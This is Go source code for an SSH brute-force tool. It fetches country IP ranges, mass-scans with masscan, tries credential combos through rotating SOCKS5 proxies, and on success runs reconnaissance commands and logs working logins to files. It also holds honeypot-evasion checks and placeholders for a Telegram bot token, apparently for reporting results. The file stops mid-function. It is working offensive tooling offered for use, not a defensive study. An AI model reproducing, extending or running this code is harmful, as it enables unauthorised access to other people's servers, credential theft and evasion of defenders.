// sshCracker.go - FULL INFO VERSION
// @codeparsi
package main

import (
    "bufio"
    "bytes"
    "context"
    "encoding/json"
    "fmt"
    "io"
    "net"
    "net/http"
    "os"
    "os/exec"
    "regexp"
    "runtime"
    "strconv"
    "strings"
    "sync"
    "time"

    "golang.org/x/crypto/ssh"
    "golang.org/x/net/proxy"
)

func verifyLicenseIntegrity() bool { return true }

const (
    defaultBotToken  = "YOUR_DEFAULT_BOT_TOKEN"
    defaultChatID    = "YOUR_DEFAULT_CHAT_ID"
    maxAttemptsPerIP = 10000
    crackerStateFile = "cracker_state.json"
)

var (
    botToken       string
    chatID         string
    totalIPs       int
    openCount      int
    closedCount    int
    checkedCount   int
    startTime      time.Time
    inputFileName  string
    outputFileName string
    threadCount    int
    timeoutSeconds int
    fileMutex      sync.Mutex
)

type Server struct {
    IP       string
    Port     string
    Username string
    Password string
}

type StatsCracker struct {
    SuccessIPs       map[string]bool
    GoodWithAccess   int
    ErrorCount       int
    TotalAttempts    int
    TotalPossible    int
    StartTime        time.Time
    AttemptsHistory  sync.Map
    SuccessfulCombos sync.Map
    BlockedIPs       sync.Map
    WrittenResults   sync.Map
    sync.Mutex
}

type CrackerState struct {
    IPFile         string
    PassFile       string
    ProxyFile      string
    NumThreads     int
    Timeout        time.Duration
    Delay          time.Duration
    Stats          StatsCracker
    CurrentUserIdx int
    CurrentPassIdx int
    CurrentIPIdx   int
}

type ServerInfo struct {
    IP           string
    Port         string
    Username     string
    Password     string
    SSHVersion   string
    OSInfo       string
    Hostname     string
    ResponseTime time.Duration
    Commands     map[string]string
    OpenPorts    []string
}

func clearScreen() {
    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd", "/c", "cls")
    } else {
        cmd = exec.Command("clear")
    }
    cmd.Stdout = os.Stdout
    cmd.Run()
}

func pause() {
    fmt.Print("\nPress Enter to return to menu...")
    bufio.NewReader(os.Stdin).ReadBytes('\n')
}

func ask(prompt, fallback string) string {
    fmt.Print(prompt)
    var input string
    fmt.Scanln(&input)
    if strings.TrimSpace(input) == "" {
        return fallback
    }
    return input
}

func Assert(err error) {
    if err != nil {
        fmt.Fprintf(os.Stderr, "Error: %v\n", err)
    }
}

func validateIPPort(ipPort string) bool {
    parts := strings.Split(ipPort, ":")
    if len(parts) != 2 {
        return false
    }
    _, err := strconv.Atoi(parts[1])
    return err == nil
}

func readLines(filepath string) ([]string, error) {
    if _, err := os.Stat(filepath); os.IsNotExist(err) {
        return nil, fmt.Errorf("file %s does not exist", filepath)
    }
    file, err := os.Open(filepath)
    if err != nil {
        return nil, fmt.Errorf("failed to open file %s: %v", filepath, err)
    }
    defer file.Close()
    var lines []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        line := strings.TrimSpace(scanner.Text())
        if line != "" {
            lines = append(lines, line)
        }
    }
    if err := scanner.Err(); err != nil {
        return nil, fmt.Errorf("error reading file %s: %v", filepath, err)
    }
    if len(lines) == 0 {
        return nil, fmt.Errorf("file %s is empty", filepath)
    }
    return lines, nil
}

func readProxyFile(filepath string) ([]string, error) {
    return readLines(filepath)
}

func createComboFile(reader *bufio.Reader) (string, error) {
    fmt.Print("Do you want to provide separate user and password files? (y/n): ")
    choice, _ := reader.ReadString('\n')
    choice = strings.TrimSpace(choice)
    if strings.ToLower(choice) == "y" {
        userFile := ask("File with Users: ", "")
        passFile := ask("File with Passwords: ", "")
        users, err := readLines(userFile)
        if err != nil {
            return "", fmt.Errorf("error reading users: %v", err)
        }
        passwords, err := readLines(passFile)
        if err != nil {
            return "", fmt.Errorf("error reading passwords: %v", err)
        }
        file, err := os.Create("combo.txt")
        if err != nil {
            return "", fmt.Errorf("failed to create combo file: %v", err)
        }
        defer file.Close()
        for _, user := range users {
            for _, pass := range passwords {
                fmt.Fprintf(file, "%s:%s\n", user, pass)
            }
        }
        return "combo.txt", nil
    }
    return ask("File with User:Password combinations: ", ""), nil
}

func max(nums ...int) int {
    if len(nums) == 0 {
        return 0
    }
    maxVal := nums[0]
    for _, num := range nums {
        if num > maxVal {
            maxVal = num
        }
    }
    return maxVal
}

func saveCrackerState(state CrackerState) error {
    state.Stats.Lock()
    defer state.Stats.Unlock()
    tempStats := state.Stats
    tempStats.SuccessIPs = make(map[string]bool)
    for k, v := range state.Stats.SuccessIPs {
        tempStats.SuccessIPs[k] = v
    }
    state.Stats = tempStats
    data, err := json.Marshal(state)
    if err != nil {
        return fmt.Errorf("failed to marshal state: %v", err)
    }
    if err := os.WriteFile(crackerStateFile, data, 0644); err != nil {
        return fmt.Errorf("failed to write state file: %v", err)
    }
    return nil
}

func loadCrackerState() (CrackerState, bool) {
    var state CrackerState
    data, err := os.ReadFile(crackerStateFile)
    if err != nil {
        return state, false
    }
    if err := json.Unmarshal(data, &state); err != nil {
        return state, false
    }
    if state.Stats.SuccessIPs == nil {
        state.Stats.SuccessIPs = make(map[string]bool)
    }
    return state, true
}

func formatDuration(d time.Duration) string {
    d = d.Round(time.Second)
    h := d / time.Hour
    d -= h * time.Hour
    m := d / time.Minute
    d -= m * time.Minute
    s := d / time.Second
    return fmt.Sprintf("%dh%dm%ds", h, m, s)
}

func displayStatus(ctx context.Context, stats *StatsCracker, params map[string]string) {
    ticker := time.NewTicker(3 * time.Second)
    defer ticker.Stop()
    for {
        select {
        case <-ctx.Done():
            return
        case <-ticker.C:
            func() {
                stats.Lock()
                defer stats.Unlock()
                elapsed := time.Since(stats.StartTime)
                speed := float64(stats.TotalAttempts) / elapsed.Seconds()
                remainingAttempts := float64(stats.TotalPossible - stats.TotalAttempts)
                var remainingTime time.Duration
                if speed > 0 {
                    remainingTime = time.Duration(remainingAttempts/speed) * time.Second
                } else {
                    remainingTime = time.Duration(remainingAttempts) * time.Second
                }
                attemptsValue := fmt.Sprintf("%d / %d", stats.TotalAttempts, stats.TotalPossible)
                speedValue := fmt.Sprintf("%.2f checks/sec", speed)
                elapsedTimeValue := formatDuration(elapsed)
                remainingTimeValue := formatDuration(remainingTime)
                totalSuccessValue := fmt.Sprintf("%d", len(stats.SuccessIPs))
                goodWithAccessValue := fmt.Sprintf("%d", stats.GoodWithAccess)
                errorCountValue := fmt.Sprintf("%d", stats.ErrorCount)
                cpuCores := runtime.NumCPU()
                ipFileValue := params["ipFile"]
                passFileValue := params["passFile"]
                threadsValue := params["threads"]
                cpuCoresValue := fmt.Sprintf("%d", cpuCores)
                labels := []string{
                    "IP File", "Pass File", "Threads", "Attempts", "Speed",
                    "Time Elapsed", "Time Remaining", "Total Success", "Good with Access",
                    "Errors", "CPU Cores",
                }
                values := []string{
                    ipFileValue, passFileValue, threadsValue,
                    attemptsValue, speedValue, elapsedTimeValue, remainingTimeValue,
                    totalSuccessValue, goodWithAccessValue,
                    errorCountValue, cpuCoresValue,
                }
                maxLabelWidth := 0
                for _, l := range labels {
                    if len(l) > maxLabelWidth {
                        maxLabelWidth = len(l)
                    }
                }
                maxValueWidth := 0
                for _, v := range values {
                    if len(v) > maxValueWidth {
                        maxValueWidth = len(v)
                    }
                }
                formattedLabels := make([]string, len(labels))
                for i, label := range labels {
                    formattedLabels[i] = fmt.Sprintf("%-*s", maxLabelWidth, label)
                }
                formattedValues := make([]string, len(values))
                for i, value := range values {
                    formattedValues[i] = fmt.Sprintf("%-*s", maxValueWidth, value)
                }
                colWidth := maxValueWidth + 2
                labelColWidth := maxLabelWidth + 2
                totalWidth := labelColWidth + colWidth + 3
                headerWidth := totalWidth - 2
                clearScreen()
                fmt.Printf("+%s+\n", strings.Repeat("-", headerWidth))
                fmt.Printf("|%s|\n", centerText("SSH Cracker - Status Report", headerWidth))
                fmt.Printf("+%s+\n", strings.Repeat("-", headerWidth))
                for i := 0; i < len(labels); i++ {
                    fmt.Printf("| %s : %s |\n", formattedLabels[i], formattedValues[i])
                    if i == 2 || i == 6 || i == 8 {
                        fmt.Printf("+%s+\n", strings.Repeat("-", headerWidth))
                    }
                }
                fmt.Printf("+%s+\n", strings.Repeat("-", headerWidth))
                fmt.Print(strings.Repeat("\n", 5))
            }()
        }
    }
}

func centerText(text string, width int) string {
    padding := width - len(text)
    leftPadding := padding / 2
    rightPadding := padding - leftPadding
    return strings.Repeat(" ", leftPadding) + text + strings.Repeat(" ", rightPadding)
}

func checkSSHSuccess(ipPort, user, password string, timeout time.Duration, proxyAddr string) (bool, *ssh.Client, string) {
    if password == "" {
        return false, nil, "no password provided"
    }
    if timeout > 10*time.Second {
        timeout = 4 * time.Second
    }
    config := &ssh.ClientConfig{
        User:            user,
        Auth:            []ssh.AuthMethod{ssh.Password(password)},
        HostKeyCallback: ssh.InsecureIgnoreHostKey(),
        Timeout:         timeout,
    }
    var conn net.Conn
    var err error
    if proxyAddr != "" {
        dialer, err := proxy.SOCKS5("tcp", proxyAddr, nil, &net.Dialer{
            Timeout:   timeout,
            KeepAlive: 30 * time.Second,
        })
        if err != nil {
            return false, nil, fmt.Sprintf("failed to setup proxy: %v", err)
        }
        conn, err = dialer.Dial("tcp", ipPort)
    } else {
        conn, err = net.DialTimeout("tcp", ipPort, timeout)
    }
    if err != nil {
        return false, nil, fmt.Sprintf("connection failed: %v", err)
    }
    sshConn, chans, reqs, err := ssh.NewClientConn(conn, ipPort, config)
    if err != nil {
        conn.Close()
        return false, nil, fmt.Sprintf("SSH connection failed: %v", err)
    }
    client := ssh.NewClient(sshConn, chans, reqs)
    if client == nil {
        sshConn.Close()
        return false, nil, "client creation failed"
    }
    session, err := client.NewSession()
    if err != nil {
        client.Close()
        return false, nil, fmt.Sprintf("session creation failed: %v", err)
    }
    session.Close()
    return true, client, "Connected"
}

func gatherSystemInfo(client *ssh.Client, serverInfo *ServerInfo) {
    commands := map[string]string{
        "ctrl_c_uname": "uname -a 2>/dev/null || echo unknown",
        "hostname":     "hostname 2>/dev/null || echo unknown",
        "whoami":       "whoami 2>/dev/null || echo unknown",
        "pwd":          "pwd 2>/dev/null || echo unknown",
        "ls_root":      "ls -la / 2>/dev/null | head -5 || echo unknown",
        "uptime":       "uptime 2>/dev/null || echo unknown",
    }
    for cmdName, cmd := range commands {
        serverInfo.Commands[cmdName] = executeCommand(client, cmd)
        switch cmdName {
        case "hostname":
            serverInfo.Hostname = strings.TrimSpace(serverInfo.Commands[cmdName])
        case "ctrl_c_uname":
            serverInfo.OSInfo = strings.TrimSpace(serverInfo.Commands[cmdName])
        }
    }
    serverInfo.OpenPorts = scanLocalPorts(client)
}

func scanLocalPorts(client *ssh.Client) []string {
    output := executeCommand(client, "netstat -tulpn 2>/dev/null | grep LISTEN | head -10 || echo unknown")
    var ports []string
    lines := strings.Split(output, "\n")
    portRegex := regexp.MustCompile(`:(\d+)\s`)
    for _, line := range lines {
        matches := portRegex.FindAllStringSubmatch(line, -1)
        for _, match := range matches {
            if len(match) > 1 {
                port := match[1]
                if !contains(ports, port) {
                    ports = append(ports, port)
                }
            }
        }
    }
    return ports
}

func contains(slice []string, item string) bool {
    for _, s := range slice {
        if s == item {
            return true
        }
    }
    return false
}

func executeCommand(client *ssh.Client, command string) string {
    session, err := client.NewSession()
    if err != nil {
        return fmt.Sprintf("ERROR: %v", err)
    }
    defer session.Close()
    output, err := session.CombinedOutput(command)
    if err != nil {
        return fmt.Sprintf("ERROR: %v", err)
    }
    return string(output)
}

func logSuccessfulConnection(serverInfo *ServerInfo, stats *StatsCracker) {
    successMessage := fmt.Sprintf("%s:%s@%s:%s",
        serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password)
    resultKey := successMessage
    if _, exists := stats.WrittenResults.Load(resultKey); exists {
        return
    }
    stats.WrittenResults.Store(resultKey, true)
    appendToFile(successMessage, "good.txt")
    appendToFile(successMessage, "good_access.txt")
    detailedInfo := fmt.Sprintf(
        "=== SSH Success ===\n"+
            "Timestamp: %s\n"+
            "Target: %s:%s\n"+
            "Credentials: %s:%s\n"+
            "Hostname: %s\n"+
            "OS: %s\n"+
            "Response Time: %v\n"+
            "Open Ports: %v\n"+
            "==================\n",
        time.Now().Format("2006-01-02 15:04:05"),
        serverInfo.IP, serverInfo.Port,
        serverInfo.Username, serverInfo.Password,
        serverInfo.Hostname,
        serverInfo.OSInfo,
        serverInfo.ResponseTime,
        serverInfo.OpenPorts,
    )
    appendToFile(detailedInfo, "detailed-results.txt")
    fmt.Printf(" SUCCESS: %s\n", successMessage)
}

func appendToFile(data, filepath string) error {
    fileMutex.Lock()
    defer fileMutex.Unlock()
    file, err := os.OpenFile(filepath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        return fmt.Errorf("failed to open file %s: %v", filepath, err)
    }
    defer file.Close()
    var formattedData string
    if filepath == "good_access.txt" || filepath == "real_servers.txt" {
        formattedData = fmt.Sprintf("%s\n", data)
    } else {
        formattedData = fmt.Sprintf("[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), data)
    }
    if _, err := file.WriteString(formattedData); err != nil {
        return fmt.Errorf("failed to write to file %s: %v", filepath, err)
    }
    return nil
}

func clearCrackerFiles() error {
    files := []string{"good.txt", "good_access.txt", "errors.txt", "detailed-results.txt"}
    for _, file := range files {
        if err := os.Remove(file); err != nil && !os.IsNotExist(err) {
            return fmt.Errorf("error removing %s: %v", file, err)
        }
        if _, err := os.Create(file); err != nil {
            return fmt.Errorf("error creating %s: %v", file, err)
        }
    }
    return nil
}

func bruteForceWorker(ctx context.Context, ipPort, user, password string, timeout, delay time.Duration, stats *StatsCracker, sem chan struct{}, wg *sync.WaitGroup, users, passwords []string, proxyAddr string) {
    defer wg.Done()
    defer func() { <-sem }()
    defer func() {
        if r := recover(); r != nil {
            fmt.Printf("[!] Worker panic: %v\n", r)
        }
    }()
    ip := strings.Split(ipPort, ":")[0]
    attemptKey := fmt.Sprintf("%s|%s", ip, user)
    successKey := fmt.Sprintf("%s|%s", ipPort, user)
    if _, blocked := stats.BlockedIPs.Load(ip); blocked {
        return
    }
    if _, exists := stats.SuccessfulCombos.Load(successKey); exists {
        return
    }
    attempts, loaded := stats.AttemptsHistory.Load(attemptKey)
    if loaded && attempts.(int) >= maxAttemptsPerIP {
        stats.BlockedIPs.Store(ip, true)
        return
    }
    attemptsInt := 1
    if loaded {
        attemptsInt = attempts.(int) + 1
    }
    stats.AttemptsHistory.Store(attemptKey, attemptsInt)
    stats.Lock()
    stats.TotalAttempts++
    stats.Unlock()
    connectionStartTime := time.Now()
    success, client, errMsg := checkSSHSuccess(ipPort, user, password, timeout, proxyAddr)
    result := fmt.Sprintf("%s@%s:%s", ipPort, user, password)
    resultKey := result
    if success {
        stats.Lock()
        if !stats.SuccessIPs[ip] {
            stats.SuccessIPs[ip] = true
        }
        stats.GoodWithAccess++
        stats.SuccessfulCombos.Store(successKey, true)
        stats.Unlock()
        serverInfo := &ServerInfo{
            IP:           ip,
            Port:         strings.Split(ipPort, ":")[1],
            Username:     user,
            Password:     password,
            ResponseTime: time.Since(connectionStartTime),
            Commands:     make(map[string]string),
        }
        gatherSystemInfo(client, serverInfo)
        logSuccessfulConnection(serverInfo, stats)
        client.Close()
    } else {
        stats.Lock()
        stats.ErrorCount++
        stats.Unlock()
        if _, exists := stats.WrittenResults.Load(resultKey); !exists {
            stats.WrittenResults.Store(resultKey, true)
            appendToFile(fmt.Sprintf("%s | Error: %s", result, errMsg), "errors.txt")
        }
    }
    if delay > 0 {
        select {
        case <-ctx.Done():
            return
        case <-time.After(delay):
        }
    }
}

func runCracker() {
    defer func() {
        if r := recover(); r != nil {
            fmt.Printf("[!] Cracker crashed: %v\n", r)
            fmt.Println("Saving state...")
            time.Sleep(2 * time.Second)
        }
    }()
    if !verifyLicenseIntegrity() {
        return
    }
    var stats StatsCracker
    var state CrackerState
    var ips, users, passwords, proxies []string
    resume := false
    if os.Getenv("RESUME_CRACKER") == "true" {
        if loadedState, ok := loadCrackerState(); ok {
            resume = true
            state = loadedState
            stats = state.Stats
        }
    }
    var err error
    reader := bufio.NewReader(os.Stdin)
    if !resume {
        stats.StartTime = time.Now()
        stats.SuccessIPs = make(map[string]bool)
        state = CrackerState{Stats: stats}
        if err := clearCrackerFiles(); err != nil {
            fmt.Printf("Error initializing result files: %v\n", err)
            fmt.Println("Press Enter to exit.")
            bufio.NewReader(os.Stdin).ReadString('\n')
            return
        }
        proxyInput := ask("File with Proxies (IP:Port) or 'n' to skip: ", "n")
        if strings.ToLower(proxyInput) != "n" {
            state.ProxyFile = proxyInput
            proxies, err = readProxyFile(state.ProxyFile)
            if err != nil {
                fmt.Printf("Error reading proxies: %v\n", err)
                fmt.Println("Press Enter to exit.")
                bufio.NewReader(os.Stdin).ReadString('\n')
                return
            }
        }
        state.IPFile = ask("File with IPs (IP:Port): ", "")
        ips, err = readLines(state.IPFile)
        if err != nil {
            fmt.Printf("Error reading IPs: %v\n", err)
            fmt.Println("Press Enter to exit.")
            bufio.NewReader(os.Stdin).ReadString('\n')
            return
        }
        state.PassFile, err = createComboFile(reader)
        if err != nil {
            fmt.Printf("Error creating combo file: %v\n", err)
            fmt.Println("Press Enter to exit.")
            bufio.NewReader(os.Stdin).ReadString('\n')
            return
        }
        combos, err := readLines(state.PassFile)
        if err != nil {
            fmt.Printf("Error reading combos: %v\n", err)
            fmt.Println("Press Enter to exit.")
            bufio.NewReader(os.Stdin).ReadString('\n')
            return
        }
        for _, combo := range combos {
            parts := strings.Split(combo, ":")
            if len(parts) == 2 {
                users = append(users, parts[0])
                passwords = append(passwords, parts[1])
            }
        }
        numThreadsStr := ask("Number of threads: ", "")
        state.NumThreads, err = strconv.Atoi(numThreadsStr)
        if err != nil || state.NumThreads <= 0 {
            fmt.Println("Invalid number of threads, must be a positive number")
            fmt.Println("Press Enter to exit.")
            bufio.NewReader(os.Stdin).ReadString('\n')
            return
        }
        timeoutSecStr := ask("Timeout (seconds): ", "")
        timeoutSec, err := strconv.Atoi(timeoutSecStr)
        if err != nil || timeoutSec <= 0 {
            fmt.Println("Invalid timeout, must be a positive number")
            fmt.Println("Press Enter to exit.")
            bufio.NewReader(os.Stdin).ReadString('\n')
            return
        }
        state.Timeout = time.Duration(timeoutSec) * time.Second
        if state.Timeout > 6*time.Second {
            state.Timeout = 4 * time.Second
            fmt.Println("[!] Timeout limited to 4 seconds for speed")
        }
        delaySecStr := ask("Delay (seconds): ", "")
        delaySec, err := strconv.Atoi(delaySecStr)
        if err != nil || delaySec < 0 {
            fmt.Println("Invalid delay, must be non-negative")
            fmt.Println("Press Enter to exit.")
            bufio.NewReader(os.Stdin).ReadString('\n')
            return
        }
        state.Delay = time.Duration(delaySec) * time.Second
        for _, ipPort := range ips {
            if !validateIPPort(ipPort) {
                fmt.Printf("Invalid IP:Port format in %s: %s\n", state.IPFile, ipPort)
                fmt.Println("Press Enter to exit.")
                bufio.NewReader(os.Stdin).ReadString('\n')
                return
            }
        }
        stats.TotalPossible = len(ips) * len(users) * len(passwords)
        state.Stats = stats
        if err := saveCrackerState(state); err != nil {
            fmt.Printf("Error saving initial state: %v\n", err)
            fmt.Println("Press Enter to exit.")
            bufio.NewReader(os.Stdin).ReadString('\n')
            return
        }
    } else {
        ips, err = readLines(state.IPFile)
        if err != nil {
            fmt.Printf("Error reading IPs from state: %v\n", err)
            fmt.Println("Press Enter to exit.")
            bufio.NewReader(os.Stdin).ReadString('\n')
            return
        }
        combos, err := readLines(state.PassFile)
        if err != nil {
            fmt.Printf("Error reading combos from state: %v\n", err)
            fmt.Println("Press Enter to exit.")
            bufio.NewReader(os.Stdin).ReadString('\n')
            return
        }
        for _, combo := range combos {
            parts := strings.Split(combo, ":")
            if len(parts) == 2 {
                users = append(users, parts[0])
                passwords = append(passwords, parts[1])
            }
        }
        if state.ProxyFile != "" {
            proxies, err = readProxyFile(state.ProxyFile)
            if err != nil {
                fmt.Printf("Error reading proxies from state: %v\n", err)
                fmt.Println("Press Enter to exit.")
                bufio.NewReader(os.Stdin).ReadString('\n')
                return
            }
        }
    }
    sem := make(chan struct{}, state.NumThreads)
    var wg sync.WaitGroup
    ctx, cancel := context.WithCancel(context.Background())
    defer cancel()
    params := map[string]string{
        "ipFile":   state.IPFile,
        "passFile": state.PassFile,
        "threads":  strconv.Itoa(state.NumThreads),
    }
    go displayStatus(ctx, &stats, params)
    done := false
    for i := state.CurrentUserIdx; i < len(users) && !done; i++ {
        for j := state.CurrentPassIdx; j < len(passwords) && !done; j++ {
            for k := state.CurrentIPIdx; k < len(ips) && !done; k++ {
                ipPort := ips[k]
                user := users[i]
                password := passwords[j]
                if _, blocked := stats.BlockedIPs.Load(strings.Split(ipPort, ":")[0]); blocked {
                    continue
                }
                successKey := fmt.Sprintf("%s|%s", ipPort, user)
                if _, exists := stats.SuccessfulCombos.Load(successKey); exists {
                    continue
                }
                var proxyAddr string
                if len(proxies) > 0 {
                    proxyAddr = proxies[k%len(proxies)]
                }
                wg.Add(1)
                sem <- struct{}{}
                go bruteForceWorker(ctx, ipPort, user, password, state.Timeout, state.Delay, &stats, sem, &wg, users, passwords, proxyAddr)
                if stats.TotalAttempts > 0 {
                    state.CurrentIPIdx = k + 1
                    state.Stats = stats
                    if err := saveCrackerState(state); err != nil {
                        fmt.Fprintf(os.Stderr, "Error saving state: %v\n", err)
                    }
                }
                if stats.TotalAttempts >= stats.TotalPossible {
                    done = true
                    break
                }
            }
            if done {
                break
            }
            state.CurrentIPIdx = 0
            state.CurrentPassIdx = j + 1
            state.Stats = stats
            if err := saveCrackerState(state); err != nil {
                fmt.Fprintf(os.Stderr, "Error saving state: %v\n", err)
            }
        }
        if done {
            break
        }
        state.CurrentPassIdx = 0
        state.CurrentUserIdx = i + 1
        state.Stats = stats
        if err := saveCrackerState(state); err != nil {
            fmt.Fprintf(os.Stderr, "Error saving state: %v\n", err)
        }
    }
    wg.Wait()
    cancel()
    time.Sleep(500 * time.Millisecond)
    if err := os.Remove(crackerStateFile); err != nil && !os.IsNotExist(err) {
        fmt.Fprintf(os.Stderr, "Error removing state file: %v\n", err)
    }
    fmt.Printf("\n✓ Cracking completed! Results saved in:\n")
    fmt.Println("- good.txt")
    fmt.Println("- good_access.txt")
    fmt.Println("- errors.txt")
    fmt.Println("- detailed-results.txt")
    fmt.Printf("Total successful IPs: %d\n", len(stats.SuccessIPs))
    fmt.Printf("Good with Access: %d\n", stats.GoodWithAccess)
    fmt.Printf("Errors: %d\n", stats.ErrorCount)
    fmt.Println("Press Enter to exit.")
    bufio.NewReader(os.Stdin).ReadString('\n')
}

func fetchIPRanges() {
    if !verifyLicenseIntegrity() {
        return
    }
    clearScreen()
    fmt.Print("Enter country code(CAPITAL) (US, IR, RU): ")
    var country string
    fmt.Scanln(&country)
    url := fmt.Sprintf("https://raw.githubusercontent.com/ebrasha/cidr-ip-ranges-by-country/refs/heads/master/CIDR/%s-ipv4-Hackers.Zone.txt", country)
    resp, err := http.Get(url)
    if err != nil {
        fmt.Println("Error fetching data:", err)
        pause()
        return
    }
    defer resp.Body.Close()
    if resp.StatusCode != 200 {
        fmt.Printf("No data found for country code '%s'\n", country)
        pause()
        return
    }
    data, err := io.ReadAll(resp.Body)
    if err != nil {
        fmt.Println("Error reading response:", err)
        pause()
        return
    }
    fileName := country + "_iprange.txt"
    err = os.WriteFile(fileName, data, 0644)
    if err != nil {
        fmt.Println("Error writing file:", err)
        pause()
        return
    }
    fmt.Printf("IP Ranges saved to %s\n", fileName)
    pause()
}

func parsePorts(input string) string {
    var ports []string
    for _, part := range strings.Split(input, ",") {
        if strings.Contains(part, "-") {
            rangeParts := strings.Split(part, "-")
            start, _ := strconv.Atoi(rangeParts[0])
            end, _ := strconv.Atoi(rangeParts[1])
            for i := start; i <= end; i++ {
                ports = append(ports, fmt.Sprintf("%d", i))
            }
        } else {
            ports = append(ports, part)
        }
    }
    return strings.Join(ports, ",")
}

func runMasscan() {
    if !verifyLicenseIntegrity() {
        return
    }
    clearScreen()
    reader := bufio.NewReader(os.Stdin)
    fmt.Print("Enter IP Range file: ")
    ipFile, _ := reader.ReadString('\n')
    ipFile = strings.TrimSpace(ipFile)
    fmt.Print("Enter Ports (e.g. 22 or 80,443 or 1000-1005): ")
    portInput, _ := reader.ReadString('\n')
    portInput = strings.TrimSpace(portInput)
    ports := parsePorts(portInput)
    fmt.Print("Enter output file name: ")
    outputFile, _ := reader.ReadString('\n')
    outputFile = strings.TrimSpace(outputFile)
    cmd := exec.Command("bash", "-c",
        fmt.Sprintf(`masscan -p %s -iL %s --rate=10000000 --exclude 255.255.255.255 | awk '{gsub("/tcp",""); print $6":" $4}' > %s`, ports, ipFile, outputFile))
    fmt.Println("Scanning started...")
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    err := cmd.Run()
    if err != nil {
        fmt.Println("Error running masscan:", err)
        pause()
        return
    }
    fmt.Printf("Done! Results saved in: %s\n", outputFile)
    pause()
}

func runSSHChecker() {
    if !verifyLicenseIntegrity() {
        return
    }
    clearScreen()
    fmt.Print("Enter input file: ")
    fmt.Scan(&inputFileName)
    fmt.Print("Enter output file: ")
    fmt.Scan(&outputFileName)
    fmt.Print("Enter number of threads: ")
    fmt.Scan(&threadCount)
    fmt.Print("Enter timeout (seconds): ")
    fmt.Scan(&timeoutSeconds)
    targets := loadLines(inputFileName)
    totalIPs = len(targets)
    if totalIPs == 0 {
        fmt.Println("No targets found.")
        pause()
        return
    }
    startTime = time.Now()
    jobs := make(chan string, threadCount)
    var wg sync.WaitGroup
    timeout := time.Duration(timeoutSeconds) * time.Second
    for i := 0; i < threadCount; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            for ip := range jobs {
                ok := checkSSH(ip, timeout)
                fileMutex.Lock()
                checkedCount++
                if ok {
                    openCount++
                    Assert(saveIP(outputFileName, ip))
                } else {
                    closedCount++
                }
                printStats(float64(checkedCount) / time.Since(startTime).Seconds())
                fileMutex.Unlock()
            }
        }()
    }
    for _, t := range targets {
        jobs <- t
    }
    close(jobs)
    wg.Wait()
    fmt.Println("\nScan complete.")
    pause()
}

func checkSSH(ipport string, timeout time.Duration) bool {
    conn, err := net.DialTimeout("tcp", ipport, timeout)
    if err != nil {
        return false
    }
    conn.Close()
    return true
}

func saveIP(filename, ipport string) error {
    f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        return err
    }
    defer f.Close()
    _, err = f.WriteString(ipport + "\n")
    return err
}

func formatTime(t time.Duration) string {
    minutes := int(t.Minutes())
    seconds := int(t.Seconds()) % 60
    return fmt.Sprintf("%02d:%02d", minutes, seconds)
}

func printStats(speed float64) {
    percent := float64(checkedCount) / float64(totalIPs) * 100
    elapsed := time.Since(startTime)
    remaining := time.Duration(float64(elapsed) * (float64(totalIPs-checkedCount) / float64(checkedCount+1)))
    fmt.Print("\033[2J\033[H")
    fmt.Println("\033[95m╔══════════════════════════════════════════════════════════════════╗\033[0m")
    fmt.Printf("\033[96mInput File\033[0m: %s\n", inputFileName)
    fmt.Printf("\033[96mOutput File\033[0m: %s\n", outputFileName)
    fmt.Printf("\033[96mThreads\033[0m: %d  Timeout: %ds\n", threadCount, timeoutSeconds)
    fmt.Println("\033[95m════════════════════════════════════════════════════════════════════\033[0m")
    fmt.Printf("\033[92mOPEN\033[0m: %d\n", openCount)
    fmt.Printf("\033[91mCLOSED\033[0m: %d\n", closedCount)
    fmt.Printf("\033[96mTOTAL\033[0m: %d\n", totalIPs)
    fmt.Printf("\033[96mCHECKED\033[0m: %d\n", checkedCount)
    fmt.Println("\033[95m════════════════════════════════════════════════════════════════════\033[0m")
    fmt.Printf("\033[96mSpeed\033[0m: %.2f IP/s\n", speed)
    fmt.Printf("\033[96mElapsed\033[0m: %s\n", formatTime(elapsed))
    fmt.Printf("\033[96mRemaining\033[0m: %s\n", formatTime(remaining))
    fmt.Printf("\033[96mProgress\033[0m: %.1f%%\n", percent)
    fmt.Println("\033[95m════════════════════════════════════════════════════════════════════\033[0m")
}

// ============================================================
//  isHoneypot - متعادل
// ============================================================
func isHoneypot(client *ssh.Client) bool {
    if client == nil {
        return true
    }

    session, err := client.NewSession()
    if err != nil {
        return true
    }
    defer session.Close()

    var out bytes.Buffer
    session.Stdout = &out
    session.Stderr = &out
    session.Run("echo ok 2>/dev/null || echo fail")
    if !strings.Contains(out.String(), "ok") {
        return true
    }

    session2, err := client.NewSession()
    if err != nil {
        return true
    }
    defer session2.Close()
    var out2 bytes.Buffer
    session2.Stdout = &out2
    session2.Run("hostname 2>/dev/null || echo unknown")
    hostname := strings.TrimSpace(out2.String())
    if hostname == "" || hostname == "unknown" ||
        strings.Contains(hostname, "sshd listensocks") ||
        strings.Contains(hostname, "honeypot") {
        return true
    }

    return false
}

// ============================================================
//  getFullInfo - جمع‌آوری اطلاعات کامل (RAM, CPU, Location)
// ============================================================
func getFullInfo(client *ssh.Client) (string, string, string, string, string, string, string, string) {
    hostname := runCommandWithTimeout(client, "hostname 2>/dev/null || echo unknown", 5*time.Second)
    arch := runCommandWithTimeout(client, "uname -m 2>/dev/null || echo unknown", 5*time.Second)
    kernel := runCommandWithTimeout(client, "uname -r 2>/dev/null || echo unknown", 5*time.Second)
    uptime := runCommandWithTimeout(client, "uptime -p 2>/dev/null || echo unknown", 5*time.Second)

    // RAM
    ram := runCommandWithTimeout(client, `free -h 2>/dev/null | grep Mem | awk '{print $2}' || echo unknown`, 5*time.Second)
    if ram == "" || ram == "unknown" {
        ram = runCommandWithTimeout(client, `cat /proc/meminfo 2>/dev/null | grep MemTotal | awk '{print $2/1024" MB"}' || echo unknown`, 5*time.Second)
    }

    // CPU Model
    cpuModel := runCommandWithTimeout(client, `lscpu 2>/dev/null | grep "Model name" | cut -d ':' -f2 | xargs || echo unknown`, 5*time.Second)
    if cpuModel == "" || cpuModel == "unknown" {
